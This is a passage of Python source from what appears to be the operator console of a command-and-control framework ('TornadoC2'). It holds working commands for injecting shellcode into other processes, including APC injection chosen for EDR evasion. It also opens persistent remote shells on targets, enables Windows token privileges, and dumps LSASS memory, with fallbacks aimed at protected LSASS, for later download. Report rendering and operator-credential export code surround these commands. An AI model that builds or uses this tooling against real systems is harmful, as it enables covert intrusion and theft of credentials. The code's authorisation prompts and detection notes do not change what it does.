                     (Linux). The historical path; highest
                     fidelity, highest signal.
            apc      Remote APC injection, Windows only. Queues
                     the shellcode to the target's existing
                     threads through NtQueueApcThread. No new
                     thread, no remote-thread-creation event, but
                     NtQueueApcThread is itself instrumented.

        When --method is omitted, the build-time default is used.
        The agent re-validates the value and refuses `--self
        --method` and `apc` on non-Windows targets; the console
        forwards what the operator typed.
        """
        c = CLR
        if len(parts) < 2:
            print(f"{c['red']}usage: migrate --self | <pid> | "
                  f"<process-name> [--method default|apc]"
                  f"{c['reset']}")
            return

        target = parts[1]
        rest = parts[2:]

        if target in ('--self', 'self'):
            has_method = '--method' in rest or any(
                a.startswith('--method=') for a in rest)
            if has_method:
                print(f"{c['red']}migrate --self does not accept "
                      f"--method; the detached-spawn path is the "
                      f"only self-migration form.{c['reset']}")
                return
            out, err, code = self._send_and_wait(
                'migrate', ['--self'], timeout=60)
            self._render_inline_result('migrate --self',
                                       out, err, code)
            return

        # ---- Injection path ------------------------------------
        # Confirm before queuing. The action is one-shot into a
        # running process, and on a successful injection the
        # parent unlinks its own on-disk binary. The operator
        # should acknowledge that before it happens.
        method_hint = ''
        i = 0
        while i < len(rest):
            a = rest[i]
            if a == '--method' and i + 1 < len(rest):
                method_hint = rest[i + 1]
                break
            if a.startswith('--method='):
                method_hint = a.split('=', 1)[1]
                break
            i += 1

        print()
        print(f"  {c['yellow']}migrate will inject the agent's "
              f"embedded shellcode into the target process."
              f"{c['reset']}")
        print(f"  {c['dim']}The parent beacon unlinks its own "
              f"on-disk binary five seconds after a successful "
              f"injection. The session survives on the new "
              f"process with the same beacon ID.{c['reset']}")

        if method_hint == 'apc':
            print(f"  {c['dim']}Method: apc — the shellcode is "
                  f"queued to the target's threads and runs on "
                  f"the first alertable wait. NtQueueApcThread "
                  f"is instrumented by every major EDR vendor; "
                  f"the technique raises the cost of detection "
                  f"but does not remove the signal.{c['reset']}")
        elif method_hint in ('default', ''):
            print(f"  {c['dim']}Method: default — "
                  f"CreateRemoteThread on Windows, ptrace on "
                  f"Linux. The historical path; highest "
                  f"signal.{c['reset']}")

        try:
            ans = input(
                f"  {c['green']}proceed? [y/N]{c['reset']} "
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            print(f"{c['dim']}cancelled{c['reset']}")
            return
        if ans not in ('y', 'yes'):
            print(f"{c['dim']}cancelled{c['reset']}")
            return

        out, err, code = self._send_and_wait(
            'migrate', list(parts[1:]), timeout=180)
        self._render_inline_result('migrate', out, err, code)

    # ------------------------------------------------------------------
    # Interactive shell

    _SHELL_WARNING = (
        "\n"
        "  An interactive shell holds a /bin/sh (Linux) or cmd.exe\n"
        "  (Windows) process open on the target for as long as this\n"
        "  session runs. The shell is a long-lived child of the\n"
        "  beacon, visible in the target's process tree, and every\n"
        "  command typed here is a write() to its stdin.\n"
        "\n"
        "  This is the highest-artifact mode the framework offers.\n"
        "  A defender watching process creation, parent-child\n"
        "  relations, or the beacon's /proc/<pid>/task/*/children\n"
        "  entry sees it on the first `ps`. Prefer `sh <cmd>` for\n"
        "  one-off commands; reserve this for sessions where the\n"
        "  state persistence (cd, env, shell variables) is worth\n"
        "  the exposure.\n"
    )

    def _cmd_shell(self, parts):
        """shell [start|stop|status|exec <cmd>]

        An interactive shell on the target, held open across
        check-ins. Entering interactive mode prompts before
        dispatching `shell start` because a persistent child
        process is high-signal on any host with EDR or a process
        monitor.
        """
        c = CLR
        sub = parts[1].lower() if len(parts) > 1 else ''

        if sub == 'status':
            out, err, _ = self._send_and_wait(
                'shell', ['status'], timeout=30, quiet=True)
            self._render_inline_result(
                'shell status', out, err, None)
            return

        if sub == 'stop':
            out, err, _ = self._send_and_wait(
                'shell', ['stop'], timeout=15, quiet=True)
            self._render_inline_result(
                'shell stop', out, err, None)
            return

        if sub == 'exec':
            if len(parts) < 3:
                print(f"{c['red']}usage: shell exec <cmd...>"
                      f"{c['reset']}")
                return
            cmd_line = ' '.join(parts[2:])
            out, err, _ = self._send_and_wait(
                'shell', ['exec', cmd_line], timeout=180,
                quiet=True)
            self._render_inline_result(
                'shell exec', out, err, None)
            return

        if sub and sub != 'start':
            print(f"{c['red']}usage: shell [start | stop | status "
                  f"| exec <cmd>]{c['reset']}")
            return

        self._shell_interactive()

    def _shell_interactive(self):
        c = CLR

        # Check current state first so a re-entry into the loop
        # does not re-ask. If a shell is already running, the
        # operator accepted the warning when they started it.
        out, err, _ = self._send_and_wait(
            'shell', ['status'], timeout=15, quiet=True)
        if err is not None:
            print(f"{c['red']}shell status check failed: {err}"
                  f"{c['reset']}")
            return
        status_text = (out or b'').decode(
            'utf-8', errors='replace')
        already_running = 'not running' not in status_text

        if not already_running:
            print(self._SHELL_WARNING)
            try:
                ans = input(
                    f"  {c['yellow']}Start an interactive shell? "
                    f"[y/N]{c['reset']} ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                print()
                print(f"{c['dim']}cancelled{c['reset']}")
                return
            if ans not in ('y', 'yes'):
                print(f"{c['dim']}cancelled — no shell started"
                      f"{c['reset']}")
                return

            out, err, _ = self._send_and_wait(
                'shell', ['start'], timeout=30, quiet=True)
            if err is not None:
                print(f"{c['red']}shell start failed: {err}"
                      f"{c['reset']}")
                return
            print(f"{c['green']}✓{c['reset']} "
                  f"{(out or b'').decode('utf-8', errors='replace').strip()}")

        print(f"{c['dim']}entering interactive shell. type "
              f"`exit` or `.` on its own line to leave. the "
              f"shell process stays running on the target; use "
              f"`shell stop` to kill it.{c['reset']}")

        try:
            while True:
                try:
                    line = input(
                        f"{c['magenta']}shell>{c['reset']} ")
                except KeyboardInterrupt:
                    print()
                    continue
                except EOFError:
                    print()
                    break

                if not line.strip():
                    continue
                if line.strip() in ('exit', 'quit', '.'):
                    break

                out, err, _ = self._send_and_wait(
                    'shell', ['exec', line], timeout=180,
                    quiet=True)
                if err is not None:
                    print(f"{c['red']}{err}{c['reset']}")
                    continue
                text = (out or b'').decode(
                    'utf-8', errors='replace').rstrip()
                if text:
                    _print_wrapped(text)
                else:
                    print(f"{c['dim']}(no output){c['reset']}")
        finally:
            print(f"{c['dim']}left interactive shell — the shell "
                  f"process is still running on the target. "
                  f"`shell stop` kills it; `shell` re-enters "
                  f"without re-prompting.{c['reset']}")

    def _cmd_enablepriv(self, parts):
        """enablepriv — list, enable, or disable Windows token
        privileges.

        The agent does the token work through advapi32 directly,
        in-process. Everything the target does not need — the
        privilege catalogue, the risk buckets, the formatting —
        stays on this side.
        """
        c = CLR
        args = parts[1:]

        if not args or args[0] in ('-h', '--help', 'help'):
            print(self._ENABLEPRIV_USAGE)
            return

        mode = 'plain'
        agent_args = []
        disable = False

        for a in args:
            low = a.lower()
            if low in ('--list', 'list'):
                mode = 'plain'
            elif low in ('--list-all', 'list-all'):
                mode = 'list-all'
            elif low in ('--vuln', 'vuln'):
                mode = 'vuln'
            elif a in ('--all',):
                agent_args.append('--all')
            elif a in ('--disable', '-d'):
                agent_args.append('--disable')
                disable = True
            elif a.startswith('-'):
                print(f"{c['red']}enablepriv: unknown option "
                      f"{a!r}{c['reset']}")
                print(self._ENABLEPRIV_USAGE)
                return
            else:
                agent_args.append(a)

        send_args = agent_args
        if mode in ('list-all', 'vuln'):
            send_args = ['--list']

        out, err, _ = self._send_and_wait(
            'enablepriv', send_args, timeout=45)
        if err is not None:
            print(f"{c['red']}enablepriv failed: {err}"
                  f"{c['reset']}")
            return

        text = (out or b'').decode('utf-8',
                                   errors='replace').strip()
        try:
            env = json.loads(text)
        except Exception as exc:
            print(f"{c['red']}enablepriv: unparseable response: "
                  f"{exc}{c['reset']}")
            return

        env_mode = env.get('mode')
        if env_mode == 'list':
            self._enablepriv_render_list(env, mode)
        elif env_mode == 'change':
            self._enablepriv_render_change(env)
        else:
            print(f"{c['red']}enablepriv: unknown response mode "
                  f"{env_mode!r}{c['reset']}")

    def _enablepriv_render_list(self, env, mode):
        c = CLR
        privs = env.get('privileges') or []
        if not privs:
            print(f"{c['yellow']}token reports no privileges"
                  f"{c['reset']}")
            return

        held = {p['name']: p['state'] for p in privs}

        if mode == 'plain':
            order = {'ENABLED': 0, 'DISABLED': 1, 'REMOVED': 2}
            rows = sorted(held.items(),
                          key=lambda kv: (order.get(kv[1], 3), kv[0]))
            _header(f'TOKEN PRIVILEGES  ·  {len(rows)}')
            for name, state in rows:
                marker = self._enablepriv_state_marker(state, c)
                desc = _ENABLEPRIV_CATALOGUE.get(name, '')
                print(f"  {marker}  {name:<45} {desc}")
            print(f"  {c['cyan']}[+] enabled   [ ] disabled   "
                  f"[-] removed{c['reset']}")
            return

        if mode == 'list-all':
            held_rows = []
            not_held = []
            for name in sorted(_ENABLEPRIV_CATALOGUE):
                state = held.get(name)
                if state:
                    held_rows.append((name, state))
                else:
                    not_held.append((name, _ENABLEPRIV_CATALOGUE[name]))
            extras = [
                (name, state)
                for name, state in sorted(held.items())
                if name not in _ENABLEPRIV_CATALOGUE
            ]
            _header(
                f'TOKEN PRIVILEGES  ·  {len(held_rows)} held of '
                f'{len(_ENABLEPRIV_CATALOGUE)} in catalogue')
            if held_rows:
                print(f"{c['green']}Held by token:{c['reset']}")
                for name, state in held_rows:
                    marker = self._enablepriv_state_marker(state, c)
                    print(f"  {marker}  {name:<45} "
                          f"{_ENABLEPRIV_CATALOGUE[name]}")
            if extras:
                print(f"{c['green']}Additional (non-catalogue):"
                      f"{c['reset']}")
                for name, state in extras:
                    marker = self._enablepriv_state_marker(state, c)
                    print(f"  {marker}  {name}")
            if not_held:
                print(f"{c['yellow']}Not held by this token:"
                      f"{c['reset']}")
                for name, desc in not_held:
                    print(f"  {c['red']}[x]{c['reset']}  "
                          f"{name:<45} {desc}")
            print(f"  {c['cyan']}[+] enabled   [ ] disabled   "
                  f"[-] removed   [x] not held{c['reset']}")
            return

        if mode == 'vuln':
            tier_style = {
                'CRITICAL': c['red'],
                'HIGH':     c['yellow'],
                'MEDIUM':   c['cyan'],
                'LOW':      c['blue'],
            }
            bucketed = {t: [] for t in _ENABLEPRIV_TIERS}
            uncategorised = []
            for name, state in sorted(held.items()):
                placed = False
                for tier, entries in _ENABLEPRIV_TIERS.items():
                    if name in entries:
                        bucketed[tier].append(
                            (name, state, entries[name]))
                        placed = True
                        break
                if not placed:
                    uncategorised.append((name, state))

            total = sum(len(v) for v in bucketed.values())
            _header(f'PRIVILEGE RISK  ·  {total} of {len(held)} '
                    f'held privileges carry security weight')
            for tier in ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW'):
                rows = bucketed[tier]
                if not rows:
                    continue
                style = tier_style[tier]
                print(f"{style}{tier} ({len(rows)}):{c['reset']}")
                rows.sort(key=lambda r: (
                    0 if r[1] == 'ENABLED' else 1, r[0]))
                for name, state, reason in rows:
                    marker = self._enablepriv_state_marker(state, c)
                    print(f"  {marker}  {name:<45} {reason}")
            if uncategorised:
                print(f"{c['cyan']}Uncategorised:"
                      f"{c['reset']}")
                for name, state in uncategorised:
                    marker = self._enablepriv_state_marker(state, c)
                    print(f"  {marker}  {name}")
            print(f"  {c['cyan']}[+] enabled   [ ] disabled   "
                  f"[-] removed{c['reset']}")

    def _enablepriv_render_change(self, env):
        c = CLR
        results = env.get('results') or []
        if not results:
            print(f"{c['yellow']}no privileges changed{c['reset']}")
            return
        ok_count = 0
        for r in results:
            name = r.get('name', '?')
            if r.get('ok'):
                ok_count += 1
                print(f"  {c['green']}✓{c['reset']} {name}")
            else:
                err = r.get('error') or 'failed'
                print(f"  {c['red']}✗{c['reset']} {name}  "
                      f"{c['dim']}{err}{c['reset']}")
        print()
        print(f"  {c['dim']}{ok_count}/{len(results)} "
              f"succeeded{c['reset']}")

    _LSASSD_DUMP_USAGE = (
        "lsassdump — LSASS minidump.\n"
        "\n"
        "Usage:\n"
        "  lsassdump --dump [--fork] [--duplicate] [--elevate] "
        "[--out <path>]\n"
        "\n"
        "Options:\n"
        "  --dump            Required. Creates the dump.\n"
        "  --fork            Add the NtCreateSection + "
        "NtCreateProcessEx\n"
        "                    fallback. Reaches PPL-protected "
        "LSASS when\n"
        "                    PROCESS_CREATE_PROCESS is granted.\n"
        "  --duplicate       Add the system handle-table walk. "
        "Borrows an\n"
        "                    existing VM_READ handle to LSASS "
        "instead of\n"
        "                    opening one; slow, needs a holder "
        "to exist.\n"
        "  --elevate         Acquire SeDebugPrivilege before "
        "opening LSASS.\n"
        "                    Skip when the beacon is already "
        "SYSTEM.\n"
        "  --out <path>      Target-side path for the dump "
        "(default\n"
        "                    %TEMP%\\lsass.dmp). %VAR% is "
        "expanded on the\n"
        "                    target.\n"
        "\n"
        "Technique precedence when multiple flags are set:\n"
        "  1. direct OpenProcess + MiniDumpWriteDump\n"
        "  2. --duplicate\n"
        "  3. --fork\n"
        "\n"
        "The dump stays on the target. Download it with the "
        "framework's\n"
        "chunked transfer:\n"
        "  download <target_path> <local_path>\n"
        "\n"
        "This is the highest-signal verb the framework ships. "
        "Every EDR\n"
        "watches for the LSASS ProcessAccess event, the "
        "MiniDumpWriteDump\n"
        "import, and the NtCreateProcessEx-from-LSASS pattern. "
        "The verb\n"
        "runs in-process through syscall — no subprocess, no "
        "PowerShell,\n"
        "no Add-Type — but the action itself is the signature. "
        "Confirm the\n"
        "engagement authorises it before proceeding."
    )

    def _cmd_lsassdump(self, parts):
        c = CLR
        args = parts[1:]

        if not args or args[0] in ('-h', '--help', 'help'):
            print(self._LSASSD_DUMP_USAGE)
            return

        if '--dump' not in args and '-d' not in args:
            print(f"{c['red']}lsassdump: --dump is required"
                  f"{c['reset']}")
            print(self._LSASSD_DUMP_USAGE)
            return

        print()
        print(f"  {c['yellow']}{c['bold']}lsassdump will create a "
              f"minidump of LSASS on the target.{c['reset']}")
        print(f"  {c['dim']}This is the highest-signal action the "
              f"framework can take. Every EDR watches for the "
              f"LSASS ProcessAccess event, the MiniDumpWriteDump "
              f"import, and the NtCreateProcessEx-from-LSASS "
              f"pattern. The verb runs in-process through syscall; "
              f"it is not a subprocess and it will not appear in "
              f"Sysmon EventID 1 — but the action itself is the "
              f"signature, and no transport change hides it."
              f"{c['reset']}")
        try:
            ans = input(
                f"  {c['green']}proceed? [y/N]{c['reset']} "
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            print(f"{c['dim']}cancelled{c['reset']}")
            return
        if ans not in ('y', 'yes'):
            print(f"{c['dim']}cancelled{c['reset']}")
            return

        print(f"{c['cyan']}[*]{c['reset']} running lsassdump…")
        out, err, _ = self._send_and_wait(
            'lsassdump', args, timeout=300)
        if err is not None:
            print(f"{c['red']}lsassdump failed: {err}"
                  f"{c['reset']}")
            return

        text = (out or b'').decode('utf-8',
                                   errors='replace').strip()
        try:
            env = json.loads(text)
        except Exception as exc:
            print(f"{c['red']}lsassdump: unparseable response: "
                  f"{exc}{c['reset']}")
            return

        if not env.get('ok'):
            msg = env.get('error') or 'unknown error'
            print(f"{c['red']}lsassdump failed: {msg}"
                  f"{c['reset']}")
            return

        path = env.get('path') or '?'
        size = int(env.get('size') or 0)
        method = env.get('method') or '?'
        print(f"{c['green']}✓{c['reset']} dump created on target "
              f"via {c['cyan']}{method}{c['reset']}")
        print(f"  {c['dim']}path:{c['reset']} "
              f"{c['cyan']}{path}{c['reset']}")
        print(f"  {c['dim']}size:{c['reset']} "
              f"{_human_bytes(size)}")
        print()
        print(f"  {c['dim']}the dump is on the target. Download "
              f"it with:{c['reset']}")
        print(f"    {c['cyan']}download {path} lsass.dmp"
              f"{c['reset']}")

    def _cmd_export(self, parts):
        """export [output_path]

        Fetch the full session dump from the server and render a
        self-contained HTML report locally. Same content as the
        server console's `export`, but the file lands on the client
        machine.
        """
        try:
            r = self.tp.post(
                f'/api/v1/beacon/{self.current_beacon}/dump', {})
        except Exception as exc:
            print(f"{CLR['red']}export failed: {exc}{CLR['reset']}")
            return
        if not r or 'session' not in r:
            print(f"{CLR['red']}export failed: unexpected response"
                  f"{CLR['reset']}")
            return

        session = r['session']
        results = r.get('results') or []
        log_text = r.get('log')

        if len(parts) > 1:
            out_path = parts[1]
        else:
            stamp = time.strftime('%Y%m%d_%H%M%S')
            safe = (session.get('display_name') or 'beacon')
            for ch in ('/', '\\', '@', ' ', ':'):
                safe = safe.replace(ch, '_')
            filename = (f"beacon_{session['id']}_{safe}_{stamp}.html")
            out_path = os.path.join('exports', filename)

        try:
            parent = os.path.dirname(os.path.abspath(out_path))
            if parent:
                os.makedirs(parent, exist_ok=True)
        except OSError:
            pass

        html = self._render_beacon_html(session, results, log_text)
        try:
            with open(out_path, 'w', encoding='utf-8') as fh:
                fh.write(html)
        except OSError as exc:
            print(f"{CLR['red']}write failed: {exc}{CLR['reset']}")
            return

        size = os.path.getsize(out_path)
        print(f"{CLR['green']}✓{CLR['reset']} exported "
              f"{CLR['cyan']}#{session['id']}{CLR['reset']} "
              f"to {out_path} ({size} bytes)")

    @staticmethod
    def _render_beacon_html(session, results, log_text):
        """Render the beacon session dump as a standalone HTML page.

        Layout mirrors the server console's export so an operator
        who has used one recognises the other. No external assets.
        """
        import html as _html

        def esc(v):
            if v is None:
                return ''
            return _html.escape(str(v))

        # ---- Identity table
        ident = session.get('identity') or {}
        if ident:
            ident_rows = ''.join(
                f"<tr><th>{esc(k)}</th><td>{esc(v)}</td></tr>"
                for k, v in sorted(ident.items()))
        else:
            ident_rows = ("<tr><td colspan='2'>(no identity)"
                          "</td></tr>")

        # ---- Scheduling rows
        if session.get('work_hours_start') == \
                session.get('work_hours_end'):
            wh = "Disabled (24/7)"
        else:
            def _fmt(m):
                return f"{m // 60:02d}:{m % 60:02d}"
            wh = (f"{_fmt(session.get('work_hours_start', 0))} – "
                  f"{_fmt(session.get('work_hours_end', 0))}")

        kd = session.get('kill_deadline') or 0
        if kd:
            kill_str = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(kd))
            remaining = kd - time.time()
            if remaining > 0:
                kill_str += f" (self-destruct in {int(remaining // 86400)}d)"
            else:
                kill_str += " (expired)"
        else:
            kill_str = "None"

        first_seen = time.strftime(
            '%Y-%m-%d %H:%M:%S',
            time.localtime(session.get('first_seen', 0)))
        last_seen = time.strftime(
            '%Y-%m-%d %H:%M:%S',
            time.localtime(session.get('last_seen', 0)))

        sched_rows = ''.join((
            f"<tr><th>Fingerprint</th>"
            f"<td class='mono'>{esc(session.get('fingerprint'))}"
            f"</td></tr>",
            f"<tr><th>First seen</th><td>{esc(first_seen)}</td></tr>",
            f"<tr><th>Last seen</th><td>{esc(last_seen)}</td></tr>",
            f"<tr><th>Check-ins</th><td>"
            f"{session.get('checkins', 0)}</td></tr>",
            f"<tr><th>Last address</th>"
            f"<td class='mono'>{esc(session.get('last_addr') or '?')}"
            f"</td></tr>",
            f"<tr><th>Sleep interval</th>"
            f"<td>{session.get('sleep_interval', 0)}s "
            f"(jitter {session.get('jitter', 0.0):.2f})</td></tr>",
            f"<tr><th>Kill deadline</th><td>{esc(kill_str)}</td></tr>",
            f"<tr><th>Working hours</th><td>{wh}</td></tr>",
            f"<tr><th>Rejected results</th>"
            f"<td>{session.get('rejected_results', 0)}</td></tr>",
        ))

        # ---- Results
        history_parts = []
        for idx, res in enumerate(results, 1):
            try:
                out_bytes = _b64.b64decode(
                    res.get('output_b64') or '')
                out_text = out_bytes.decode('utf-8', errors='replace')
            except Exception:
                out_text = '<decode error>'
            err = res.get('error') or ''
            block = [
                "<div class='task'>",
                "<div class='task-hdr'>",
                f"<span class='task-num'>#{idx}</span>",
                f"<span class='task-id mono'>"
                f"{esc(res.get('id', '?'))}</span>",
                f"<span class='task-exit'>exit "
                f"{res.get('exit_code', 0)}</span>",
                "</div>",
            ]
            if err:
                block.append(f"<pre class='err'>{esc(err)}</pre>")
            if out_text:
                if len(out_text) > 4000:
                    preview = out_text[:2000]
                    block.append(
                        "<details open>"
                        f"<summary>output ({len(out_text)} bytes)"
                        f"</summary>"
                        f"<pre class='out'>{esc(preview)}"
                        f"…\n[truncated; see session log]</pre>"
                        "</details>")
                else:
                    block.append(
                        f"<pre class='out'>{esc(out_text)}</pre>")
            block.append("</div>")
            history_parts.append(''.join(block))
        history = ''.join(history_parts) if history_parts else \
            "<p class='empty'>No task results.</p>"

        # ---- Log
        if log_text:
            lines = log_text.splitlines()
            numbered = '\n'.join(
                f"{i:>5}  {line}" for i, line in enumerate(lines, 1))
            log_html = esc(numbered)
        else:
            log_html = '(no session log available)'

        ident_str = session.get('display_name', '?')
        ident_os = ident.get('os', '?')
        ident_arch = ident.get('arch', '')
        platform = f"{ident_os}/{ident_arch}" if ident_arch else ident_os
        generated = time.strftime('%Y-%m-%d %H:%M:%S')

        return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Beacon #{esc(session.get('id'))} — {esc(ident_str)}</title>
<style>
:root {{
  --bg: #ffffff; --fg: #1f2328; --muted: #656d76;
  --border: #d0d7de; --code-bg: #f6f8fa; --red: #cf222e;
}}
body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
       Arial, sans-serif; font-size: 15px; line-height: 1.55;
       color: var(--fg); background: var(--bg); margin: 0; }}
.page {{ max-width: 900px; margin: 0 auto;
         padding: 48px 32px 96px; }}
header.report {{ border-bottom: 2px solid var(--border);
                 padding-bottom: 16px; margin-bottom: 32px; }}
header.report h1 {{ margin: 0 0 4px; font-size: 26px; }}
header.report .subtitle {{ color: var(--muted); font-size: 14px;
                           margin: 0; }}
header.report .generated {{ color: var(--muted); font-size: 12px;
                            margin-top: 8px; }}
.cards {{ display: grid;
          grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
          gap: 12px; margin: 24px 0 40px; }}
.card {{ border: 1px solid var(--border); border-radius: 6px;
         padding: 12px 16px; background: var(--code-bg); }}
.card .label {{ color: var(--muted); font-size: 12px;
                text-transform: uppercase; letter-spacing: .05em;
                margin-bottom: 4px; }}
.card .value {{ font-size: 16px; font-weight: 600;
                word-break: break-word; }}
.card .value.mono {{ font-family: ui-monospace, Menlo, Consolas,
                     monospace; font-size: 13px; }}
h2 {{ font-size: 18px; margin: 40px 0 12px;
      border-bottom: 1px solid var(--border);
      padding-bottom: 6px; }}
table {{ border-collapse: collapse; width: 100%; margin: 8px 0; }}
th, td {{ text-align: left; padding: 6px 12px 6px 0;
          vertical-align: top; border-bottom: 1px solid #f0f3f6; }}
th {{ color: var(--muted); font-weight: 500; width: 180px;
      white-space: nowrap; }}
.mono {{ font-family: ui-monospace, Menlo, Consolas, monospace;
         font-size: 13px; }}
.task {{ border: 1px solid var(--border); border-radius: 6px;
         margin: 12px 0; overflow: hidden; }}
.task-hdr {{ display: flex; justify-content: space-between;
             align-items: center; padding: 8px 12px;
             background: var(--code-bg);
             border-bottom: 1px solid var(--border); font-size: 13px;
             gap: 12px; }}
.task-num {{ color: var(--muted); font-weight: 600;
             min-width: 32px; }}
.task-id {{ color: var(--muted); flex: 1; overflow: hidden;
            text-overflow: ellipsis; white-space: nowrap; }}
.task-exit {{ color: var(--muted); font-size: 12px; }}
.task pre {{ margin: 0; padding: 12px 16px; background: #fff;
             font-family: ui-monospace, Menlo, Consolas, monospace;
             font-size: 13px; white-space: pre-wrap;
             word-break: break-word; overflow-x: auto; }}
.task pre.err {{ color: var(--red); background: #fff5f5;
                 border-bottom: 1px solid var(--border); }}
details summary {{ cursor: pointer; padding: 6px 16px;
                   background: var(--code-bg);
                   border-bottom: 1px solid var(--border);
                   color: var(--muted); font-size: 13px;
                   user-select: none; }}
.log {{ background: var(--code-bg);
        border: 1px solid var(--border); border-radius: 6px;
        padding: 12px 16px;
        font-family: ui-monospace, Menlo, Consolas, monospace;
        font-size: 12px; line-height: 1.5;
        white-space: pre-wrap; word-break: break-word;
        color: var(--muted); max-height: 400px; overflow-y: auto; }}
.empty {{ color: var(--muted); font-style: italic; }}
.footer {{ margin-top: 64px; padding-top: 16px;
           border-top: 1px solid var(--border);
           color: var(--muted); font-size: 12px; }}
code {{ background: var(--code-bg); border-radius: 3px;
        padding: 1px 5px;
        font-family: ui-monospace, Menlo, Consolas, monospace;
        font-size: .9em; }}
</style>
</head>
<body>
<div class="page">
<header class="report">
  <h1>Beacon Session Report</h1>
  <p class="subtitle">Beacon <strong>#{esc(session.get('id'))}
     </strong> — {esc(ident_str)} — {esc(platform)}</p>
  <p class="generated">Generated {esc(generated)}</p>
</header>

<div class="cards">
  <div class="card">
    <div class="label">Platform</div>
    <div class="value">{esc(platform)}</div>
  </div>
  <div class="card">
    <div class="label">Check-ins</div>
    <div class="value">{session.get('checkins', 0)}</div>
  </div>
  <div class="card">
    <div class="label">Sleep</div>
    <div class="value">{session.get('sleep_interval', 0)}s &times; \
{session.get('jitter', 0.0):.2f}</div>
  </div>
  <div class="card">
    <div class="label">Task results</div>
    <div class="value">{len(results)}</div>
  </div>
  <div class="card">
    <div class="label">Last seen</div>
    <div class="value mono">{esc(last_seen)}</div>
  </div>
  <div class="card">
    <div class="label">Fingerprint</div>
    <div class="value mono">\
{esc((session.get('fingerprint') or '')[:16])}…</div>
  </div>
</div>

<h2>Identity</h2>
<table>{ident_rows}</table>

<h2>Scheduling &amp; state</h2>
<table>{sched_rows}</table>

<h2>Task history</h2>
{history}

<h2>Session log</h2>
<pre class="log">{log_html}</pre>

<footer class="footer">
  <p>Beacon session <code>#{esc(session.get('id'))}</code> &middot;
     fingerprint <code>{esc(session.get('fingerprint'))}</code></p>
  <p>Generated by TornadoC2 operator client.</p>
</footer>
</div>
</body>
</html>
"""

    def _verify_export_bundle(self, cfg):
        """Return a list of problems with a config about to be
        written to disk. Empty list means the bundle is internally
        consistent.

        Three checks:

          1. The client cert chains to the CA in the same config.
             A failure means the server minted the cert under a
             different CA than the one it is now embedding — the
             same class of bug as the one that causes
             TLSV1_ALERT_UNKNOWN_CA at connect time, caught here
             instead.
          2. The client key matches the client cert. A failure
             means the pair on the server was mismatched when the
             config was exported.
          3. Both the CA and the client cert parse as X.509.

        Returns a list of human-readable strings. Called from
        `operators export` before writing anything to disk.
        """
        problems = []
        try:
            from cryptography import x509 as _x509
            from cryptography.hazmat.primitives.asymmetric \
                import padding as _padding
            from cryptography.hazmat.primitives import serialization \
                as _ser
        except ImportError:
            return problems

        ca_pem = cfg.get('ca_pem') or ''
        cert_pem = cfg.get('client_cert') or ''
        key_pem = cfg.get('client_key') or ''

        try:
            ca_obj = _x509.load_pem_x509_certificate(
                ca_pem.encode('utf-8'))
        except Exception as exc:
            problems.append(f"CA is not valid X.509: {exc}")
            ca_obj = None

        try:
            leaf_obj = _x509.load_pem_x509_certificate(
                cert_pem.encode('utf-8'))
        except Exception as exc:
            problems.append(f"client cert is not valid X.509: {exc}")
            leaf_obj = None

        # ---- 1. Cert chains to CA -----------------------------------
        if ca_obj is not None and leaf_obj is not None:
            try:
                ca_obj.public_key().verify(
                    leaf_obj.signature,
                    leaf_obj.tbs_certificate_bytes,
                    _padding.PKCS1v15(),
                    leaf_obj.signature_hash_algorithm,
                )
            except Exception as exc:
                problems.append(
                    f"client cert does not chain to the config's "
                    f"CA: {exc}. The server exported a cert signed "
                    f"by a different CA than the one it embedded. "
                    f"Re-run `operators export` on the server; if "
                    f"the mismatch persists, the operator's cert on "
                    f"disk is stale — remove and re-add on the "
                    f"server.")

        # ---- 2. Key matches cert ------------------------------------
        if leaf_obj is not None and key_pem:
            try:
                priv = _ser.load_pem_private_key(
                    key_pem.encode('utf-8'), password=None)
                cert_pub_der = leaf_obj.public_key().public_bytes(
                    encoding=_ser.Encoding.DER,
                    format=_ser.PublicFormat.SubjectPublicKeyInfo,
                )
                key_pub_der = priv.public_key().public_bytes(
                    encoding=_ser.Encoding.DER,
                    format=_ser.PublicFormat.SubjectPublicKeyInfo,
                )
                if cert_pub_der != key_pub_der:
                    problems.append(
                        "client key does not match the client "
                        "cert's public key. The two files on the "
                        "server were mismatched when the config "
                        "was exported.")
            except Exception as exc:
                problems.append(
                    f"client key is not a usable PEM private "
                    f"key: {exc}")

        return problems

    def _cmd_operators_export(self, parts):
        """operators export [<name>] [<local_path>]

        Export an operator config. With no name, exports your own.
        With a name, exports that operator's config — requires
        admin, and the target must not be an admin.

        The config is a bearer credential. Anything that reads the
        file it writes can authenticate as the named operator.
        Transfer it out of band: not over the C2 channel, not over
        plain email, not via a chat.

        Examples:
            operators export
            operators export alice
            operators export alice /tmp/alice.cfg
        """

        import hashlib as _hl
        target = None
        out_path = None

        for arg in parts[2:]:
            if '/' in arg or '\\' in arg:
                out_path = arg
            else:
                target = arg

        payload = {}
        if target:
            payload['name'] = target

        try:
            r = self.tp.post('/api/v1/operators/export', payload)
        except Exception as exc:
            print(f"{CLR['red']}export failed: {exc}"
                  f"{CLR['reset']}")
            return

        if not r.get('config_b64'):
            print(f"{CLR['red']}server did not return a config"
                  f"{CLR['reset']}")
            return

        try:
            raw = _b64.b64decode(r['config_b64'])
        except Exception as exc:
            print(f"{CLR['red']}config decode failed: {exc}"
                  f"{CLR['reset']}")
            return

        want_sha = (r.get('sha256') or '').lower()
        got_sha = _hl.sha256(raw).hexdigest()
        if want_sha and got_sha != want_sha:
            print(f"{CLR['red']}sha256 mismatch — refusing to write "
                  f"the file{CLR['reset']}")
            return

        name = r.get('name') or target or self.name
        if out_path is None:
            out_path = f'{name}.cfg'

        out_path = os.path.abspath(
            os.path.expanduser(out_path))

        # ---- Verify the bundle before writing ---------------------
        try:
            import json as _json
            cfg_obj = _json.loads(raw.decode('utf-8'))
        except Exception as exc:
            print(f"{CLR['red']}config is not valid JSON: {exc}"
                  f"{CLR['reset']}")
            return

        problems = self._verify_export_bundle(cfg_obj)

        import ssl as _ssl
        def _fp(pem):
            try:
                return hashlib.sha256(
